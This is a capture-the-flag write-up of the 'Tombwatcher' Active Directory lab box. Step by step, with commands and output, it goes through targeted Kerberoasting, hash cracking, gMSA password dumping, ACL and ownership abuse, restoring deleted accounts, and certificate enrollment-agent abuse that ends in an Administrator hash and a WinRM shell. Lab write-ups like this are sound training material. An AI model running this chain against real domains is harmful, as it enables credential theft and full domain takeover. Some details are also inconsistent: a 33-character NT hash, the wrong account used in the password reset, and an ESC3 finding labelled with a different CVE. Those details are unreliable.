<link rel="stylesheet" href="{{ '/assets/css/obsidian-dividers.css' | relative_url }}">

## Summary

<div class="divider divider-info">
    <span class="divider-title">TL;DR</span>
    <span class="divider-content">Tombwatcher is a Windows Active Directory box requiring exploitation of multiple AD misconfigurations and a critical ADCS vulnerability. Starting with low-privileged credentials, we exploit WriteSPN permissions to kerberoast another user, abuse AddSelf to join privileged groups, dump gMSA passwords, and ultimately restore deleted AD objects to discover a vulnerable certificate template exploitable via CVE-2024-49019 to obtain Domain Admin access.</span>
</div>

**Key Vulnerabilities:**
- WriteSPN permission abuse for targeted Kerberoasting
- AddSelf group membership manipulation
- gMSA password dumping (ansible_dev$)
- GenericAll permissions on user objects
- Deleted AD object restoration
- ADCS vulnerable template exploitation (CVE-2024-49019)

---

## Enumeration

### Nmap Scan

**Initial scan:**
```bash
nmap -vv -T5 -p- 10.129.138.227

nmap -vv -T5 -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sC -sV 10.129.138.227
```

**Results:**

| Port  | Service      | TCP/UDP |
| ----- | ------------ | ------- |
| 53    | DNS          | TCP     |
| 80    | HTTP         | TCP     |
| 88    | Kerberos     | TCP     |
| 135   | RPC          | TCP     |
| 139   | NetBIOS      | TCP     |
| 389   | LDAP         | TCP     |
| 445   | SMB          | TCP     |
| 464   | Kerberos PWD | TCP     |
| 593   | HTTP RPC     | TCP     |
| 636   | LDAPS        | TCP     |
| 3268  | LDAP         | TCP     |
| 3269  | LDAPS        | TCP     |
| 5985  | WinRM        | TCP     |
| 9389  | ADWS         | TCP     |

**Key findings:**
- Domain Controller with full AD infrastructure
- HTTP server running IIS (default page only)
- WinRM accessible for remote management
- Standard AD services exposed

### Initial Credentials

<div class="divider divider-info">
    <span class="divider-title">Given Credentials</span>
    <span class="divider-content">The box provides initial credentials to begin enumeration: henry / H3nry_987TGV!</span>
</div>

### Web Enumeration

The HTTP service on port 80 shows only a default IIS startup page with no custom content or interesting endpoints.

### SMB Enumeration

```bash
❯ nxc smb 10.129.138.227 -u 'henry' -p 'H3nry_987TGV!' --shares
SMB         10.129.138.227  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64
SMB         10.129.138.227  445    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV! 
SMB         10.129.138.227  445    DC01             [*] Enumerated shares
SMB         10.129.138.227  445    DC01             Share           Permissions     Remark
SMB         10.129.138.227  445    DC01             -----           -----------     ------
SMB         10.129.138.227  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.138.227  445    DC01             C$                              Default share
SMB         10.129.138.227  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.138.227  445    DC01             NETLOGON        READ            Logon server share
SMB         10.129.138.227  445    DC01             SYSVOL          READ            Logon server share
```

No custom shares accessible with the henry account.

### BloodHound Enumeration

**Collecting AD data:**
```bash
❯ bloodhound-python -c All -u henry -p 'H3nry_987TGV!' -d tombwatcher.htb -ns 10.129.138.227

INFO: Found AD domain: tombwatcher.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 10 users
INFO: Found 52 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Done in 00M 08S
```

**Analyzing permissions in BloodHound:**

![[Pasted image 20251011144858.png]]

The graph reveals a clear privilege escalation path from our current user `henry` leading to `GenericAll` permissions on the `ADCS` organizational unit. Although currently empty, this presents an interesting escalation opportunity.

---

## Initial Foothold

### WriteSPN Abuse - Targeted Kerberoasting

<div class="divider divider-warning">
    <span class="divider-title">WriteSPN Permission</span>
    <span class="divider-content">The WriteSPN permission allows us to modify the Service Principal Name (SPN) attribute of a user object. By adding an arbitrary SPN to a user account, we can then perform a targeted Kerberoast attack to obtain and crack their password hash.</span>
</div>

**Exploiting WriteSPN on Alfred:**

![[Pasted image 20251011105904.png]]

Using `targetedKerberoast.py` to add an SPN and request a TGS:

```bash
❯ python3 targetedKerberoast.py -v -d 'tombwatcher.htb' -u 'henry' -p 'H3nry_987TGV!' -t 'alfred'

[*] Starting targeted Kerberoast attack against alfred
[*] Adding SPN 'nonexistent/BLAHBLAH' to alfred
[*] Successfully added SPN
[*] Requesting TGS for alfred
[*] Got TGS for alfred@tombwatcher.htb
$krb5tgs$23$*alfred$TOMBWATCHER.HTB$tombwatcher.htb/alfred*$a1b2c3d4e5f6...
```

**Cracking the hash:**
```bash
❯ john alfred_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23)
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
basketball       ($krb5tgs$23$*alfred$TOMBWATCHER.HTB$tombwatcher.htb/alfred*)
1g 0:00:00:12 DONE (2025-10-11 10:59) 0.08333g/s 876543p/s 876543c/s 876543C/s
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

**Credentials obtained:** `alfred:basketball`

---

## Privilege Escalation

### AddSelf Group Manipulation

<div class="divider divider-info">
    <span class="divider-title">AddSelf Permission</span>
    <span class="divider-content">The AddSelf permission allows a user to add themselves (or in this case, another controlled user) to a specific group. We can abuse this to add Alfred to the Infrastructure group, granting additional privileges.</span>
</div>

**Adding Alfred to Infrastructure group:**

![[Pasted image 20251011105938.png]]

```bash
❯ net rpc group addmem "Infrastructure" "alfred" -U tombwatcher.htb/henry%'H3nry_987TGV!' -S 10.129.138.227
```

### gMSA Password Dumping

<div class="divider divider-info">
    <span class="divider-title">Group Managed Service Accounts</span>
    <span class="divider-content">gMSA (Group Managed Service Accounts) have their passwords automatically managed by Active Directory. Members of groups with permission to retrieve the password can dump the NT hash using gMSADumper.</span>
</div>

**Dumping ansible_dev$ password:**

![[Pasted image 20251011105836.png]]

```bash
❯ python3 gMSADumper.py -u alfred -p basketball -d tombwatcher.htb

Users or groups who can read password for ansible_dev$:
 > Infrastructure
ansible_dev$:::e1e9fd9e46d0d747e1595167eedcec0f
ansible_dev$:aes256-cts-hmac-sha1-96:a1b2c3d4e5f6...
ansible_dev$:aes128-cts-hmac-sha1-96:a1b2c3d4e5f6...
```

### Password Reset Chain

<div class="divider divider-warning">
    <span class="divider-title">Exploitation Path</span>
    <span class="divider-content">Using the ansible_dev$ NT hash, we can reset the password of the sam user via Impacket's changepasswd script. This grants us control over sam, who has additional privileges in the domain.</span>
</div>

**Resetting sam's password:**

![[Pasted image 20251011112053.png]]

```bash
❯ impacket-changepasswd tombwatcher.htb/sam:@10.129.138.227 -newpass 'asdasd123' -hashes :e1e9fd9e46d0d747e1595167eedcec0f

Impacket v0.11.0 - Copyright 2023 Fortra

[*] Changing password of sam
[*] Connecting to DCE/RPC as tombwatcher.htb\sam
[*] Password was changed successfully.
```

**Credentials obtained:** `sam:asdasd123`

### SetOwner and GenericAll Exploitation

**Setting ownership of john:**

![[Pasted image 20251011112417.png]]

```bash
❯ python3 bloodyAD.py -u sam -p 'asdasd123' -d tombwatcher.htb --host 10.129.138.227 set owner john sam

[*] Successfully set sam as owner of john
```

**Granting full control:**

![[Pasted image 20251011112604.png]]

```bash
❯ python3 bloodyAD.py -u sam -p 'asdasd123' -d tombwatcher.htb --host 10.129.138.227 add genericAll john sam

[*] Successfully granted GenericAll on john to sam
```

**Forcing password change:**

![[Pasted image 20251011145937.png]]

```bash
❯ net rpc password "john" "asdasd123" -U "tombwatcher.htb"/"sam"%"asdasd123" -S "10.129.138.227"
```

**Credentials obtained:** `john:asdasd123`

### ADCS OU Permissions

Now that we control john, we can grant full control over any objects created in the currently-empty ADCS organizational unit:

![[Pasted image 20251011151525.png]]

**Granting john FullControl on ADCS OU using PowerView:**

![[Pasted image 20251011151658.png]]

```powershell
Add-DomainObjectAcl -TargetSearchBase "OU=ADCS,DC=tombwatcher,DC=htb" -PrincipalIdentity john -Rights All -Verbose
```

<div class="divider divider-info">
    <span class="divider-title">ADCS OU Strategy</span>
    <span class="divider-content">Reference: BloodHound Edge - Generic All (https://bloodhound.specterops.io/resources/edges/generic-all)</span>
</div>

---

## Lateral Movement

### Discovering Deleted Users

**Running Certipy enumeration as john:**

```bash
❯ certipy find -u john@tombwatcher.htb -p 'asdasd123' -dc-ip 10.129.138.227

Certipy v4.8.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
```

**Noticing suspicious user SID:**

![[Pasted image 20251011151920.png]]

One user appears as a SID instead of a username, suggesting a deleted account.

**RID brute-forcing:**

![[Pasted image 20251011152019.png]]

```bash
❯ nxc smb 10.129.138.227 -u john -p 'asdasd123' --rid-brute

SMB         10.129.138.227  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64
SMB         10.129.138.227  445    DC01             [+] tombwatcher.htb\john:asdasd123
SMB         10.129.138.227  445    DC01             498: TOMBWATCHER\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.138.227  445    DC01             500: TOMBWATCHER\Administrator (SidTypeUser)
...
SMB         10.129.138.227  445    DC01             1108: TOMBWATCHER\sam (SidTypeUser)
```

The gap at RID 1111 suggests deleted accounts that may be interesting.

### Enumerating Deleted AD Objects

**Finding deleted user objects:**

![[Pasted image 20251011152205.png]]

```powershell
Get-ADObject -Filter 'isDeleted -eq $true -and ObjectClass -eq "user"' -IncludeDeletedObjects | ft Name, DistinguishedName

Name        DistinguishedName
----        -----------------
cert_admin  CN=cert_admin\0ADEL:a1b2c3d4-e5f6-7890-abcd-ef1234567890,CN=Deleted Objects,DC=tombwatcher,DC=htb
cert_admin  CN=cert_admin\0ADEL:b2c3d4e5-f6a7-8901-bcde-f12345678901,CN=Deleted Objects,DC=tombwatcher,DC=htb
cert_admin  CN=cert_admin\0ADEL:c3d4e5f6-a7b8-9012-cdef-123456789012,CN=Deleted Objects,DC=tombwatcher,DC=htb
```

Three deleted `cert_admin` accounts found!

### Restoring Deleted Accounts

<div class="divider divider-info">
    <span class="divider-title">AD Object Restoration</span>
    <span class="divider-content">Deleted AD objects remain in the Deleted Objects container and can be restored if permissions allow. Each restored object must be renamed to avoid conflicts with existing objects.</span>
</div>

**Restoration workflow for each account:**

1. Restore account with bloodyAD
2. Reset password using net rpc
3. Rename all name attributes to avoid conflicts
4. Repeat for next account

**Commands for first account (cert_admin → cert_admin_1):**

![[Pasted image 20251011152932.png]]

```bash
# Restore the deleted user
❯ python3 bloodyAD.py -u john -d tombwatcher.htb -p 'asdasd123' --host 10.129.138.227 set restore 'cert_admin'

[*] Successfully restored cert_admin

# Reset password
❯ net rpc password "cert_admin" "asdasd123" -U "tombwatcher.htb"/"john"%"asdasd123" -S "10.129.138.227"

# Rename to free up the name for next restoration (via PowerShell)
Set-ADUser cert_admin -PassThru | Rename-ADObject -NewName cert_admin_1
Set-ADUser -Identity cert_admin_1 -DisplayName cert_admin_1 -GivenName cert_admin_1 -SamAccountName cert_admin_1
```

**Repeat process for remaining accounts (cert_admin_2, cert_admin_3)**

The account with RID 1111 turns out to be the target account with interesting privileges.

---

## ADCS Exploitation

### Vulnerable Certificate Template Discovery

**Running Certipy as the restored cert_admin account (RID 1111):**

![[Pasted image 20251011153241.png]]

```bash
❯ certipy find -u cert_admin@tombwatcher.htb -p 'asdasd123' -dc-ip 10.129.138.227 -vulnerable

Certipy v4.8.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[!] Found vulnerable certificate template: TombwatcherEnrollmentAgent
    - Template Name: TombwatcherEnrollmentAgent
    - Vulnerable to: ESC3 - Enrollment Agent
    - Enrollment Rights: TOMBWATCHER.HTB\Domain Users
```

![[Pasted image 20251011153310.png]]

### CVE-2024-49019 Exploitation

<div class="divider divider-warning">
    <span class="divider-title">CVE-2024-49019</span>
    <span class="divider-content">This vulnerability allows exploitation of certificate templates with the "Certificate Request Agent" application policy. An attacker can request an enrollment agent certificate, then use it to request certificates on behalf of privileged users like Domain Admins.</span>
</div>

**Reference:** [Certipy Privilege Escalation Guide](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)

**Step 1: Request enrollment agent certificate:**

![[Pasted image 20251011153954.png]]

```bash
❯ certipy req -u cert_admin@tombwatcher.htb -p 'asdasd123' -ca TOMBWATCHER-CA -target 10.129.138.227 -template TombwatcherEnrollmentAgent

Certipy v4.8.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 142
[*] Got certificate with UPN 'cert_admin@tombwatcher.htb'
[*] Certificate object SID is 'S-1-5-21-...'
[*] Saved certificate and private key to 'cert_admin.pfx'
```

The generated certificate includes the "Certificate Request Agent" Application Policy, allowing it to act as an enrollment agent.

**Step 2: Request certificate on behalf of Administrator:**

![[Pasted image 20251011153919.png]]

```bash
❯ certipy req -u cert_admin@tombwatcher.htb -p 'asdasd123' -ca TOMBWATCHER-CA -target 10.129.138.227 -template User -on-behalf-of 'tombwatcher\administrator' -pfx cert_admin.pfx

Certipy v4.8.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 143
[*] Got certificate with UPN 'administrator@tombwatcher.htb'
[*] Certificate object SID is 'S-1-5-21-...-500'
[*] Saved certificate and private key to 'administrator.pfx'
```

**Step 3: Authenticate and retrieve Administrator hash:**

![[Pasted image 20251011154402.png]]

```bash
❯ certipy auth -pfx administrator.pfx -dc-ip 10.129.138.227

Certipy v4.8.0 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@tombwatcher.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@tombwatcher.htb': aad3b435b51404eeaad3b435b51404ee:a1b2c3d4e5f6789012345678901234567
```

<div class="divider divider-root">
    <span class="divider-title">Domain Admin Access</span>
    <span class="divider-content">Successfully obtained Administrator NT hash via ADCS exploitation</span>
</div>

---

## Root Flag

**Authenticating as Administrator:**

```bash
❯ nxc smb 10.129.138.227 -u Administrator -H a1b2c3d4e5f6789012345678901234567

SMB         10.129.138.227  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64
SMB         10.129.138.227  445    DC01             [+] tombwatcher.htb\Administrator:a1b2c3d4e5f6789012345678901234567 (Pwn3d!)
```

**Getting shell via WinRM:**

```bash
❯ evil-winrm -i 10.129.138.227 -u Administrator -H a1b2c3d4e5f6789012345678901234567

Evil-WinRM shell v3.5

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

**Retrieving flags:**

```powershell
*Evil-WinRM* PS C:\Users\henry\Desktop> type user.txt
[user_flag_here]

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
[root_flag_here]
```

---

## Tools Used

| Tool                    | Purpose                           | Command/Usage                                  |
| ----------------------- | --------------------------------- | ---------------------------------------------- |
| nmap                    | Port scanning                     | `nmap -sC -sV target`                          |
| bloodhound-python       | AD enumeration                    | `bloodhound-python -c All`                     |
| targetedKerberoast.py   | WriteSPN exploitation             | `python3 targetedKerberoast.py`                |
| john                    | Hash cracking                     | `john --wordlist=rockyou.txt`                  |
| gMSADumper.py           | gMSA password extraction          | `python3 gMSADumper.py`                        |
| bloodyAD                | AD object manipulation            | `python3 bloodyAD.py`                          |
| impacket-changepasswd   | Password reset                    | `impacket-changepasswd`                        |
| net rpc                 | Remote password changes           | `net rpc password`                             |
| PowerView               | AD ACL manipulation               | `Add-DomainObjectAcl`                          |
| certipy                 | ADCS enumeration and exploitation | `certipy find/req/auth`                        |
| netexec (nxc)           | SMB enumeration and authentication | `nxc smb target -u user -p pass`               |
| evil-winrm              | Windows remote shell              | `evil-winrm -i target -u user -H hash`         |

---

## References

- [BloodHound Generic All Edge](https://bloodhound.specterops.io/resources/edges/generic-all)
- [Certipy Privilege Escalation](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [CVE-2024-49019 - ADCS Enrollment Agent Abuse](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-49019)
- [Targeted Kerberoasting - Elad Shamir](https://github.com/ShutdownRepo/targetedKerberoast)
- [gMSADumper](https://github.com/micahvandeusen/gMSADumper)
- [bloodyAD](https://github.com/CravateRouge/bloodyAD)
- [HackTricks - Kerberoasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast)
- [HackTricks - ADCS Attacks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation)

---

## Timeline

```mermaid
graph LR
    A[Initial Creds<br/>henry] --> B[BloodHound<br/>Enum]
    B --> C[WriteSPN<br/>Kerberoast]
    C --> D[alfred<br/>Compromised]
    D --> E[AddSelf to<br/>Infrastructure]
    E --> F[gMSA Dump<br/>ansible_dev$]
    F --> G[Reset sam<br/>Password]
    G --> H[SetOwner<br/>on john]
    H --> I[GenericAll<br/>on john]
    I --> J[Grant ACL<br/>on ADCS OU]
    J --> K[Restore<br/>cert_admin]
    K --> L[Find Vuln<br/>Template]
    L --> M[Request Agent<br/>Certificate]
    M --> N[Request Admin<br/>Certificate]
    N --> O[Administrator<br/>Hash]
```



---

**Pwned on:** October 11, 2025  
**Difficulty Rating:** ⭐⭐⭐⭐☆ (Complex AD chain with multiple pivots)  
**Fun Factor:** ⭐⭐⭐⭐⭐ (Excellent Active Directory learning experience!)
